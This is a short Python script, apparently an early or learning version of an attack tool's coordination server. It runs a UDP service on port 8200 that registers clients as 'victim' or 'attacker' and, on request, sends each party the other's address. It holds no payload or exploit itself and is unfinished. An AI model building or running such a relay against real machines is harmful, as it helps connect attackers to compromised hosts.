import socket

socket_of_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket_of_server.bind(("0.0.0.0", 8200))
victims_ips = []
ip_of_attacker = ''
while 1:
    d, ip = socket_of_server.recvfrom(1024)
    d = d.decode()
    match d:
        case "victim":
            if ip not in victims_ips:
                victims_ips.append(ip)
            print(ip)
        case "attacker":
            ip_of_attacker = ip
            print(ip)
            # todo: send data about whom can he attack
        case "attacker exit":
            ip_of_attacker = ''
        case other:
            if d.startswith('choice'):
                choice = int(d[6:])
                if choice < len(victims_ips):
                    print(choice)
                    socket_of_server.sendto(str(victims_ips[choice])[1:-1].replace("'", "").replace(",", "").encode(),
                                            ip_of_attacker)
                    socket_of_server.sendto(str(ip_of_attacker)[1:-1].replace("'", "").replace(",", "").encode(),
                                            victims_ips[choice])

socket_of_server.close()
